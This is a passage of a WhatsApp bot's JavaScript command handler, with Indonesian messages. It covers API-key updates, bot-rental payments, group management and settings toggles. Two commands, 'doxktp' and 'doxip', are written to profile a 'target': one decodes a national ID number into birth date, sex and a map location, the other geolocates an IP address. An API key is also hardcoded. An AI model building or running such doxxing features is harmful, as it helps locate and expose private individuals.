    const ownerJid = `${global.owner}@s.whatsapp.net`;
    conn.sendMessage(ownerJid, {
        text: `📢 *Pemberitahuan Perubahan Link Seller*\n\n🔗 Link Seller telah diganti:\n- *Link Baru*: ${newLinkSeller}\n- *Tanggal & Waktu*: ${waktu}\n\n⚙️ Sistem Bot Anda telah diperbarui.`,
    });
}
break;

case 'updomain': {
    const newDomain = m.quoted ? m.quoted.text : text; // Mendapatkan teks dari input atau quote
    if (!isCreator) return Reply("❌ *Akses ditolak! Perintah ini hanya untuk pemilik bot.*");
    if (!newDomain) {
        return Reply(`⚠️ *Format salah!*\n\n📌 *Contoh:* ${prefix + command} domain.com`);
    }

    global.domain = newDomain; // Update domain global
    const waktu = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
    Reply(`✨ *Domain Panel Berhasil Diganti!*\n\n🌐 Domain baru: *${newDomain}*`);

    // Kirim pemberitahuan ke owner
    const ownerJid = `${global.owner}@s.whatsapp.net`;
    conn.sendMessage(ownerJid, {
        text: `📢 *Pemberitahuan Perubahan Domain*\n\n🌐 Domain telah diganti:\n- *Domain Baru*: ${newDomain}\n- *Tanggal & Waktu*: ${waktu}\n\n⚙️ Sistem Bot Anda telah diperbarui.`,
    });
    }
    break;

case 'upapikey': {
    const newApiKey = m.quoted ? m.quoted.text : text; // Mendapatkan teks dari input atau quote
    if (!isCreator) return Reply("❌ *Akses ditolak! Perintah ini hanya untuk pemilik bot.*");
    if (!newApiKey) {
        return Reply(`⚠️ *Format salah!*\n\n📌 *Contoh:* ${prefix + command} ApiKeyBaru123`);
    }

    global.apikey = newApiKey; // Update API key global
    const waktu = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
    Reply(`🔑 *API Key Panel Berhasil Diganti!*\n\n🔐 API Key baru: *${newApiKey}*`);

    // Kirim pemberitahuan ke owner
    const ownerJid = `${global.owner}@s.whatsapp.net`;
    conn.sendMessage(ownerJid, {
        text: `📢 *Pemberitahuan Perubahan API Key*\n\n🔑 API Key telah diganti:\n- *API Key Baru*: ${newApiKey}\n- *Tanggal & Waktu*: ${waktu}\n\n⚙️ Sistem Bot Anda telah diperbarui.`,
    });
    }
    break;

case 'upcapikey': {
    const newCaApiKey = m.quoted ? m.quoted.text : text; // Mendapatkan teks dari input atau quote
    if (!isCreator) return Reply("❌ *Akses ditolak! Perintah ini hanya untuk pemilik bot.*");
    if (!newCaApiKey) {
        return Reply(`⚠️ *Format salah!*\n\n📌 *Contoh:* ${prefix + command} CaApiKeyBaru123`);
    }

    global.capikey = newCaApiKey; // Update CA API key global
    const waktu = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
    Reply(`💡 *CA API Key Panel Berhasil Diganti!*\n\n🛡️ CA API Key baru: *${newCaApiKey}*`);

    // Kirim pemberitahuan ke owner
    const ownerJid = `${global.owner}@s.whatsapp.net`;
    conn.sendMessage(ownerJid, {
        text: `📢 *Pemberitahuan Perubahan CA API Key*\n\n💡 CA API Key telah diganti:\n- *CA API Key Baru*: ${newCaApiKey}\n- *Tanggal & Waktu*: ${waktu}\n\n⚙️ Sistem Bot Anda telah diperbarui.`,
    });
    }
    break;
    case 'updomain-v2': {
    const newDomain = m.quoted ? m.quoted.text : text; // Mendapatkan teks dari input atau quote
    if (!isCreator) return Reply("❌ *Akses ditolak! Perintah ini hanya untuk pemilik bot.*");
    if (!newDomain) {
        return Reply(`⚠️ *Format salah!*\n\n📌 *Contoh:* ${prefix + command} domain.com`);
    }

    global.domainV2 = newDomain; // Update domain global
    const waktu = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
    Reply(`✨ *Domain Panel Berhasil Diganti!*\n\n🌐 Domain baru: *${newDomain}*`);

    // Kirim pemberitahuan ke owner
    const ownerJid = `${global.owner}@s.whatsapp.net`;
    conn.sendMessage(ownerJid, {
        text: `📢 *Pemberitahuan Perubahan Domain*\n\n🌐 Domain telah diganti:\n- *Domain Baru*: ${newDomain}\n- *Tanggal & Waktu*: ${waktu}\n\n⚙️ Sistem Bot Anda telah diperbarui.`,
    });
    }
    break;

case 'upapikey-v2': {
    const newApiKey = m.quoted ? m.quoted.text : text; // Mendapatkan teks dari input atau quote
    if (!isCreator) return Reply("❌ *Akses ditolak! Perintah ini hanya untuk pemilik bot.*");
    if (!newApiKey) {
        return Reply(`⚠️ *Format salah!*\n\n📌 *Contoh:* ${prefix + command} ApiKeyBaru123`);
    }

    global.apikeyV2 = newApiKey; // Update API key global
    const waktu = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
    Reply(`🔑 *API Key Panel Berhasil Diganti!*\n\n🔐 API Key baru: *${newApiKey}*`);

    // Kirim pemberitahuan ke owner
    const ownerJid = `${global.owner}@s.whatsapp.net`;
    conn.sendMessage(ownerJid, {
        text: `📢 *Pemberitahuan Perubahan API Key*\n\n🔑 API Key telah diganti:\n- *API Key Baru*: ${newApiKey}\n- *Tanggal & Waktu*: ${waktu}\n\n⚙️ Sistem Bot Anda telah diperbarui.`,
    });
    }
    break;

case 'upcapikey-v2': {
    const newCaApiKey = m.quoted ? m.quoted.text : text; // Mendapatkan teks dari input atau quote
    if (!isCreator) return Reply("❌ *Akses ditolak! Perintah ini hanya untuk pemilik bot.*");
    if (!newCaApiKey) {
        return Reply(`⚠️ *Format salah!*\n\n📌 *Contoh:* ${prefix + command} CaApiKeyBaru123`);
    }

    global.capikeyV2 = newCaApiKey; // Update CA API key global
    const waktu = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
    Reply(`💡 *CA API Key Panel Berhasil Diganti!*\n\n🛡️ CA API Key baru: *${newCaApiKey}*`);

    // Kirim pemberitahuan ke owner
    const ownerJid = `${global.owner}@s.whatsapp.net`;
    conn.sendMessage(ownerJid, {
        text: `📢 *Pemberitahuan Perubahan CA API Key*\n\n💡 CA API Key telah diganti:\n- *CA API Key Baru*: ${newCaApiKey}\n- *Tanggal & Waktu*: ${waktu}\n\n⚙️ Sistem Bot Anda telah diperbarui.`,
    });
    }
    break;

case 'infocuaca': {
    if (!isCreator) return Reply(mess.owner)
    if (!text) return Reply ('*Silakan berikan lokasi yang ingin dicek cuacanya!*')

    try {
        let wdata = await axios.get(
            `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&lang=id`
        );

        let textw = ""
        textw += `*🗺️ Cuaca di ${text}*\n\n`
        textw += `*🌤️ Cuaca:* ${wdata.data.weather[0].main}\n`
        textw += `*📖 Deskripsi:* ${wdata.data.weather[0].description}\n`
        textw += `*🌡️ Suhu Rata-rata:* ${wdata.data.main.temp}°C\n`
        textw += `*🤒 Terasa Seperti:* ${wdata.data.main.feels_like}°C\n`
        textw += `*🌬️ Tekanan Udara:* ${wdata.data.main.pressure} hPa\n`
        textw += `*💧 Kelembaban:* ${wdata.data.main.humidity}%\n`
        textw += `*🌪️ Kecepatan Angin:* ${wdata.data.wind.speed} m/s\n`
        textw += `*📍 Latitude:* ${wdata.data.coord.lat}\n`
        textw += `*📍 Longitude:* ${wdata.data.coord.lon}\n`
        textw += `*🌍 Negara:* ${wdata.data.sys.country}\n`

        conn.sendMessage(
            m.chat, {
                text: textw,
            }, {
                quoted: qtext2,
            }
        )
    } catch (error) {
        Reply('*Terjadi kesalahan! Pastikan lokasi yang Anda masukkan benar.*')
    }
}
break

case 'nikktp': case 'doxktp':
    if (!isCreator) return Reply(mess.owner)
    if (!q) return Reply(`</> Anda harus mendapatkan NIK target terlebih dahulu dan lakukan command seperti ini : ${prefix + command} 16070xxxxx\n\n`)
    
    const { nikParser } = require('nik-parser')
    const ktp = q
    const nik = nikParser(ktp)

    const provinsi = nik.province()
    const kabupaten = nik.kabupatenKota()
    const kecamatan = nik.kecamatan()

    const mapsUrl = `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(kecamatan + ', ' + kabupaten + ', ' + provinsi)}`

    Reply(`Nik: ${nik.isValid()}
Provinsi ID: ${nik.provinceId()}
Nama Provinsi: ${provinsi}
Kabupaten ID: ${nik.kabupatenKotaId()}
Nama Kabupaten: ${kabupaten}
Kecamatan ID: ${nik.kecamatanId()}
Nama Kecamatan: ${kecamatan}
Kode Pos: ${nik.kodepos()}
Jenis Kelamin: ${nik.kelamin()}
Tanggal Lahir: ${nik.lahir()}
Uniqcode: ${nik.uniqcode()}

📍 *Lokasi di Maps:*\n(${mapsUrl})`)

break

case 'trackip': case 'doxip': {
if (!isCreator) return Reply(mess.owner)
if (!text) return Reply(`*Example:* ${prefix + command} 112.90.150.204`);
try {
let res = await fetch(`https://ipwho.is/${text}`).then(result => result.json());

const formatIPInfo = (info) => {
 return `
*IP Information*
• IP: ${info.ip || 'N/A'}
• Success: ${info.success || 'N/A'}
• Type: ${info.type || 'N/A'}
• Continent: ${info.continent || 'N/A'}
• Continent Code: ${info.continent_code || 'N/A'}
• Country: ${info.country || 'N/A'}
• Country Code: ${info.country_code || 'N/A'}
• Region: ${info.region || 'N/A'}
• Region Code: ${info.region_code || 'N/A'}
• City: ${info.city || 'N/A'}
• Latitude: ${info.latitude || 'N/A'}
• Longitude: ${info.longitude || 'N/A'}
• Is EU: ${info.is_eu ? 'Yes' : 'No'}
• Postal: ${info.postal || 'N/A'}
• Calling Code: ${info.calling_code || 'N/A'}
• Capital: ${info.capital || 'N/A'}
• Borders: ${info.borders || 'N/A'}
• Flag:
 - Image: ${info.flag?.img || 'N/A'}
 - Emoji: ${info.flag?.emoji || 'N/A'}
 - Emoji Unicode: ${info.flag?.emoji_unicode || 'N/A'}
• Connection:
 - ASN: ${info.connection?.asn || 'N/A'}
 - Organization: ${info.connection?.org || 'N/A'}
 - ISP: ${info.connection?.isp || 'N/A'}
 - Domain: ${info.connection?.domain || 'N/A'}
• Timezone:
 - ID: ${info.timezone?.id || 'N/A'}
 - Abbreviation: ${info.timezone?.abbr || 'N/A'}
 - Is DST: ${info.timezone?.is_dst ? 'Yes' : 'No'}
 - Offset: ${info.timezone?.offset || 'N/A'}
 - UTC: ${info.timezone?.utc || 'N/A'}
 - Current Time: ${info.timezone?.current_time || 'N/A'}
`;
};
 
if (!res.success) throw new Error(`IP ${text} not found!`);
await conn.sendMessage(m.chat, { location: { degreesLatitude: res.latitude, degreesLongitude: res.longitude } }, { ephemeralExpiration: 604800 });
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
await delay(2000);
Reply(formatIPInfo(res)); 
} catch (e) { 
Reply(`Error: Unable to retrieve data for IP ${text}`);
}
}
break

case 'runtime': { 
    if (!isCreator) return Reply(`❌ *Akses Ditolak!*\nHanya *Developer* yang dapat mengakses informasi ini.`);

    // Menghitung waktu runtime bot
    const botRuntime = runtime(process.uptime());
    let timestamp = speed();
    let latensi = speed() - timestamp;
    let tio = await nou.os.oos();
    var tot = await nou.drive.info();

    // Mendapatkan waktu, tanggal, dan hari saat ini dengan zona waktu WIB (GMT+7)
    const currentDate = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
    const days = ["Minggu", "Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu"];
    const day = days[currentDate.getDay()];
    const date = currentDate.toLocaleDateString("id-ID", { 
        day: 'numeric', 
        month: 'long', 
        year: 'numeric' 
    });
    const time = currentDate.toLocaleTimeString("id-ID");

    // Mengimpor data pengguna dan kasus dari database
    const sellerData = require('./library/database/premium.json');
    const seller2Data = require('./library/database/premium2.json');
    const premData = require('./library/database/seller.json');
    const ownerData = require('./library/database/owner.json');

    // Menghitung jumlah Seller, Owner, dan total kasus
    const totalSellers = sellerData.length;
    const totalSellers2 = seller2Data.length;
    const totalOwners = ownerData.length;
    const totalPrems = premData.length;

    // Menghitung total banned users
    let totalBanned = 0;
    try {
        if (fs.existsSync(bannedFile)) {
            const bannedData = JSON.parse(fs.readFileSync(bannedFile, 'utf-8'));
            totalBanned = Array.isArray(bannedData) ? bannedData.length : 0;
        }
    } catch (error) {
        console.error("Error membaca file banned.json:", error);
    }

    // Kirimkan informasi runtime bot dengan format menarik
    Reply(`
✨ *[ INFO RUNTIME BOT ]* ✨

📅 *Tanggal:*  
📆 ${day}, ${date}  

⏰ *Waktu Saat Ini (WIB):*  
🕒 ${time}  

⏳ *Durasi Operasional:*  
⏱️ ${botRuntime}  

🔴 *Informasi Server:*  
🖥️ *Platform:* ${nou.os.type()}  
💾 *Total RAM:* ${formatp(os.totalmem())}  
🗄️ *Total Disk:* ${tot.totalGb} GB  
⚙️ *Total CPU:* ${os.cpus().length} Core  
🔄 *Runtime VPS:* ${runtime(os.uptime())}  

🔵 *Informasi Bot:*  
🤖 *Version:* *${global.versi}*  
⚙️ *Mode:* *${conn.public ? "Public" : "Self"}*  
⚡ *Respon Speed:* ${latensi.toFixed(4)} detik  

👤 *Pengguna Terdaftar:*  
👑 *Owner:* ${totalOwners} orang  
🛒 *Premium:* ${totalPrems} orang  
🛒 *Seller:* ${totalSellers} orang  
🛒 *Seller2:* ${totalSellers2} orang  
⛔ *Banned:* ${totalBanned} orang  
📂 *Jumlah Fitur:* ${totalFitur()} fitur  

🛠️ *Status:*  
✅ Bot telah aktif dan siap membantu Anda!  

👑 *© 々 IjulTaka || 乂*
    `);
} 
break;

case 'totalfitur': {
if (!isCreator) return (`Maaf Fitur Ini Khusus Developer!!`)
Reply(`📂 *Jumlah Fitur:* ${totalFitur()} fitur`)
}
break

case 'mode': {
if (!isCreator) return (`Maaf Fitur Ini Khusus Developer!!`)
Reply(`⚙️ *Mode:* *${conn.public ? "Public" : "Self"}*`)
}
break

case 'ht': case 'hidetag': {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!text) return m.reply(example("pesannya"))
let member = m.metadata.participants.map(v => v.id)
await conn.sendMessage(m.chat, {text: text, mentions: [...member]}, {quoted: qtext})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'sewa': {
    await conn.sendMessage(m.chat, {
        footer: `🔥 © 2025 ${botname} 🔥`,
        buttons: [
            {
                buttonId: 'action',
                buttonText: { displayText: '🚀 Pilih Paket Sewa' },
                type: 4,
                nativeFlowInfo: {
                    name: 'single_select',
                    paramsJson: JSON.stringify({
                        title: '🤖 Pilih Sewa Bot',
                        sections: [
                            {
                                title: '📌 List Sewa Bot',
                                rows: [
                                    {
                                        title: '🕐 SEWA BOT 7 HARI',
                                        description: '💰 Rp15.000',
                                        id: '.sewabot 7 hari'
                                    },
                                    {
                                        title: '📅 SEWA BOT 1 MINGGU',
                                        description: '💰 Rp25.000',
                                        id: '.sewabot 1 minggu'
                                    },                
                                    {
                                        title: '⏳ SEWA BOT 2 MINGGU',
                                        description: '💰 Rp30.000',
                                        id: '.sewabot 2 minggu'
                                    },
                                    {
                                        title: '🗓️ SEWA BOT 1 BULAN',
                                        description: '💰 Rp45.000',
                                        id: '.sewabot 1 bulan'
                                    },                
                                    {
                                        title: '🔒 SEWA BOT PERMANEN',
                                        description: '💰 Rp65.000',
                                        id: '.sewabot permanen'
                                    },
                                    {
                                        title: '🎖️ SEWA BOT SPESIAL',
                                        description: '💰 Rp85.000',
                                        id: '.sewabot spesial'
                                    }
                                ]
                            }
                        ]
                    })
                }
            }
        ],
        headerType: 1,
        viewOnce: true,
        image: { url: global.image.reply }, 
        caption: "🔥 *Harga Sewa Bot 々 IjulTaka || 乂* 🔥\n\n" +
                 "🕐 *7 Hari* = 💰 15K\n" +
                 "📅 *1 Minggu* = 💰 25K\n" +
                 "⏳ *2 Minggu* = 💰 30K\n" +
                 "🗓️ *1 Bulan* = 💰 45K\n" +
                 "🔒 *Permanen* = 💰 65K\n" +
                 "🎖️ *Spesial* = 💰 85K\n\n" +
                 "✅ *Untuk Melanjutkan Sewa, Silahkan Pilih Tombol di Bawah Ini!*"
    }, { quoted: m });

    // Tambahan tombol untuk menghubungi developer
    await conn.sendMessage(m.chat, {
        buttons: [
            { 
                buttonId: `.owner`, 
                buttonText: { displayText: '👨‍💻 Hubungi Developer' }, 
                type: 1 
            }
        ],
        footer: `🔥 © 2025 ${botname} 🔥`,
        headerType: 1,
        viewOnce: true,
        text: teks,
        contextInfo: {
            isForwarded: true, 
            mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"], 
        },
    }, { quoted: m });
}
break;

case 'listsewabot': {
    if (!isCreator) return Reply(mess.owner);
    if (!isPc) return Reply("[ Akses Ditolak ]\nPerintah Ini Khusus Di Private Chat !!");

    let penyewa = Object.keys(db.users).filter(user => db.users[user].status_sewa);
    
    if (penyewa.length === 0) return Reply("Tidak ada pengguna yang sedang menyewa bot saat ini.");

    let teks = "📋 *Daftar Penyewa Bot:*\n\n";
    penyewa.forEach((user, i) => {
        let dataSewa = db.users[user].status_sewa;
        teks += `${i + 1}. *User:* @${user.split('@')[0]}\n   *Paket:* ${dataSewa.paket}\n   *Berakhir:* ${dataSewa.expired}\n\n`;
    });

    conn.sendMessage(m.chat, { text: teks, mentions: penyewa.map(user => user) }, { quoted: m });
}
break;

case 'sewabot': {
    if (!isCreator) return Reply(mess.owner);
    if (!isPc) return Reply("[ Akses Ditolak ]\nPerintah Ini Khusus Di Private Chat !!");
    if (!text) return Reply(`*Contoh* :\n${prefix + command} 1 minggu`);

    let hargaSewa = {
        "7 hari": 15000,
        "1 minggu": 25000,
        "2 minggu": 30000,
        "1 bulan": 45000,
        "permanen": 65000,
        "spesial": 85000
    };

    let harga = hargaSewa[text.toLowerCase()];
    if (!harga) return Reply("*Pilihan sewa tidak valid!*\n\n*Pilihan yang tersedia:* \n- 7 hari\n- 1 minggu\n- 2 minggu\n- 1 bulan\n- permanen\n- spesial");

    if (db.users[m.sender].status_deposit) return Reply("Masih ada transaksi yang belum diselesaikan, ketik .batalbeli untuk membatalkan transaksi sebelumnya!");

    let transactionId = crypto.randomBytes(4).toString("hex");
    let totalPembayaran = harga + generateRandomNumber(110, 250);

    try {
        let get = await axios.get(`https://api.simplebot.my.id/api/orkut/createpayment?apikey=${global.apiSimpleBot}&amount=${totalPembayaran}&codeqr=${global.qrisOrderKuota}`);
        let teks3 = `

乂 INFORMASI PEMBAYARAN

• ID : ${get.data.result.transactionId}
• Total Pembayaran : Rp${await toIDR(get.data.result.amount)}
• Barang : Sewa Bot (${text})
• Expired : 5 menit

Note:
QRIS pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil, bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik .batalbeli untuk membatalkan transaksi.
`;

        let msgQr = await conn.sendMessage(m.chat, {
            footer: `© 2025 ${botname}`,
            buttons: [{ buttonId: ".batalbeli", buttonText: { displayText: "Batalkan Pembelian" }, type: 1 }],
            headerType: 1,
            viewOnce: true,
            image: { url: get.data.result.qrImageUrl },
            caption: teks3,
            contextInfo: { mentionedJid: [m.sender] }
        });

        db.users[m.sender].status_deposit = true;
        db.users[m.sender].saweria = {
            msg: msgQr,
            chat: m.sender,
            idDeposit: get.data.result.transactionId,
            amount: get.data.result.amount.toString(),
            exp: function () {
                setTimeout(async () => {
                    if (db.users[m.sender].status_deposit) {
                        await conn.sendMessage(db.users[m.sender].saweria.chat, { text: "QRIS Pembayaran telah expired!" });
                        await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
                        db.users[m.sender].status_deposit = false;
                        delete db.users[m.sender].saweria;
                    }
                }, 300000); // 5 menit
            }
        };
        await db.users[m.sender].saweria.exp();

        while (db.users[m.sender].status_deposit) {
            await sleep(8000);
            let resultcek = await axios.get(`https://api.simplebot.my.id/api/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
            let req = resultcek.data;

            if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
                db.users[m.sender].status_deposit = false;
                await clearInterval(db.users[m.sender].saweria.exp);

                let cret = await conn.groupCreate(`Sewa Bot ${text}`, []);
                let ky = await conn.groupInviteCode(cret.id);

                // Hitung waktu kedaluwarsa berdasarkan paket sewa
                let waktuSekarang = Date.now();
                let waktuKedaluwarsa = {
                    "7 hari": waktuSekarang + 7 * 24 * 60 * 60 * 1000,
                    "1 minggu": waktuSekarang + 7 * 24 * 60 * 60 * 1000,
                    "2 minggu": waktuSekarang + 14 * 24 * 60 * 60 * 1000,
                    "1 bulan": waktuSekarang + 30 * 24 * 60 * 60 * 1000,
                    "permanen": Infinity,
                    "spesial": Infinity
                }[text.toLowerCase()];

                db.users[m.sender].status_sewa = {
                    paket: text,
                    expired: waktuKedaluwarsa,
                    groupId: cret.id
                };

                await conn.sendMessage(db.users[m.sender].saweria.chat, {
                    text: `

PEMBAYARAN BERHASIL DITERIMA ✅

• ID : ${db.users[m.sender].saweria.idDeposit}
• Total Pembayaran : Rp${await toIDR(db.users[m.sender].saweria.amount)}
• Barang : Sewa Bot (${text})
• Link Group : https://chat.whatsapp.com/${ky}
`,
                    quoted: db.users[m.sender].saweria.msg
                });

                // Jadwalkan bot keluar setelah masa aktif habis
                if (waktuKedaluwarsa !== Infinity) {
                    setTimeout(async () => {
                        let dataSewa = db.users[m.sender].status_sewa;
                        if (dataSewa && Date.now() >= dataSewa.expired) {
                            await conn.sendMessage(dataSewa.groupId, { text: "⏳ Masa sewa bot telah berakhir. Bot akan keluar dari grup ini." });
                            await conn.groupLeave(dataSewa.groupId);
                            delete db.users[m.sender].status_sewa;
                        }
                    }, waktuKedaluwarsa - waktuSekarang);
                }

                delete db.users[m.sender].saweria;
            }
        }
    } catch (error) {
        console.error(error);
        return Reply("Terjadi kesalahan dalam proses pembayaran. Silakan coba lagi nanti.");
    }
}
break;

case 'cgc':
case 'creategc':
if (!isCreator) return Reply(mess.owner)
if (!isPc) return Reply(`*[ Akses Ditolak ]*\n*Perintah Ini Khusus Di Private Chat !!*`)
if (!text) return Reply(`*Contoh* :\n${prefix+command} Nama Group ?`)
let creat = await conn.groupCreate(args.join(" "), [])
let kiya = await conn.groupInviteCode(creat.id)
conn.sendMessage(m.chat, { text: `SUKSES MEMBUAT GC https://chat.whatsapp.com/${kiya}
`, m})
Reply('pesan dan link group khusus sudah terkirim di chat privasi anda')
break

case "joingc": case 'join': {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("linkgcnya"))
if (!text.includes("chat.whatsapp.com")) return m.reply("Link tautan tidak valid")
let result = text.split('https://chat.whatsapp.com/')[1]
let id = await conn.groupAcceptInvite(result)
m.reply(`Berhasil bergabung ke dalam grup ${id}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'get': case "g": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("https://example.com"))
let data = await fetchJson(text)
m.reply(JSON.stringify(data, null, 2))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'joinch': case "joinchannel": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/") && !m.quoted.text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = m.quoted ? m.quoted.text.split('https://whatsapp.com/channel/')[1] : text.split('https://whatsapp.com/channel/')[1]
let res = await conn.newsletterMetadata("invite", result)
await conn.newsletterFollow(res.id)
m.reply(`
*Berhasil join channel whatsapp ✅*
* Nama channel : *${res.name}*
* Total pengikut : *${res.subscribers + 1}*
`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'autoread': {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autoread == true) return m.reply(`*Autoread* sudah aktif!`)
global.db.settings.autoread = true
return m.reply("Berhasil menyalakan *autoread*")
} else if (teks == "off") {
if (global.db.settings.autoread == false) return m.reply(`*Autoread* tidak aktif!`)
global.db.settings.autoread = false
return m.reply("Berhasil mematikan *autoread*")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'autopromosi': {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autopromosi == true) return m.reply(`*Autopromosi* sudah aktif!`)
global.db.settings.autopromosi = true
return m.reply("Berhasil menyalakan *autopromosi*")
} else if (teks == "off") {
if (global.db.settings.autopromosi == false) return m.reply(`*Autopromosi* tidak aktif!`)
global.db.settings.autopromosi = false
return m.reply("Berhasil mematikan *autopromosi*")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'autotyping': {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autotyping == true) return m.reply(`*Autotyping* sudah aktif!`)
global.db.settings.autotyping = true
return m.reply("Berhasil menyalakan *autotyping*")
} else if (teks == "off") {
if (global.db.settings.autotyping == false) return m.reply(`*Autotyping* tidak aktif!`)
global.db.settings.autotyping = false
return m.reply("Berhasil mematikan *autotyping*")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'autoreadsw': {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.readsw == true) return m.reply(`*Autoreadsw* sudah aktif!`)
global.db.settings.readsw = true
return m.reply("Berhasil menyalakan *autoreadsw*")
} else if (teks == "off") {
if (global.db.settings.readsw == false) return m.reply(`*Autoreadsw* tidak aktif!`)
global.db.settings.readsw = false
return m.reply("Berhasil mematikan *autoreadsw*")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'welcome': {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].welcome == true) return m.reply(`*Welcome* di grup ini sudah aktif!`)
global.db.groups[m.chat].welcome = true
return m.reply("Berhasil menyalakan *welcome* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].welcome == false) return m.reply(`*Welcome* di grup ini tidak aktif!`)
global.db.groups[m.chat].welcome = false
return m.reply("Berhasil mematikan *welcome* di grup ini")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'antilink': {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].antilink == true) return m.reply(`*Antilink* di grup ini sudah aktif!`)
if (global.db.groups[m.chat].antilink2 == true) global.db.groups[m.chat].antilink2 = false
global.db.groups[m.chat].antilink = true
return m.reply("Berhasil menyalakan *antilink* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].antilink == false) return m.reply(`*Antilink* di grup ini tidak aktif!`)
global.db.groups[m.chat].antilink = false
return m.reply("Berhasil mematikan *antilink* di grup ini")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'antilink2': {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].antilink2 == true) return m.reply(`*Antilink2* di grup ini sudah aktif!`)
if (global.db.groups[m.chat].antilink == true) global.db.groups[m.chat].antilink = false
global.db.groups[m.chat].antilink2 = true
return m.reply("Berhasil menyalakan *antilink2* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].antilink2 == false) return m.reply(`*Antilink2* di grup ini tidak aktif!`)
global.db.groups[m.chat].antilink2 = false
return m.reply("Berhasil mematikan *antilink2* di grup ini")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'mute': {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].mute == true) return m.reply(`*Mute* di grup ini sudah aktif!`)
global.db.groups[m.chat].mute = true
return m.reply("Berhasil menyalakan *mute* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].mute == false) return m.reply(`*Mute* di grup ini tidak aktif!`)
global.db.groups[m.chat].mute = false
return m.reply("Berhasil mematikan *mute* di grup ini")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//


case 'on':
case 'off': {
    if (!isCreator) return Reply("🚫 *Hanya pemilik yang dapat mengubah pengaturan grup.*");
    if (!m.isGroup) return Reply("🚫 *Perintah ini hanya bisa digunakan di grup.*");

    let gc = Object.keys(db.groups[m.chat]);
    
    // Tampilkan daftar pengaturan grup
    if (!text || isNaN(text)) {
        let teks = `\n*🔧 Daftar Pengaturan Grup*\n\n`;
        gc.forEach((key, index) => {
            teks += `*${index + 1}. ${capital(key)}* : ${db.groups[m.chat][key] ? "✅ _Aktif_" : "❌ _Tidak Aktif_"}\n`;
        });
        teks += `\n📌 Contoh penggunaan: *.${command} 1* untuk mengubah pengaturan pertama.`;
        return Reply(teks);
    }

    const num = Number(text);
    let total = gc.length;
    if (num > total) return Reply(`❌ *Pengaturan nomor ${num} tidak ditemukan!*`);

    const event = gc[num - 1];
    
    // Ubah status pengaturan
    global.db.groups[m.chat][event] = command === "on";
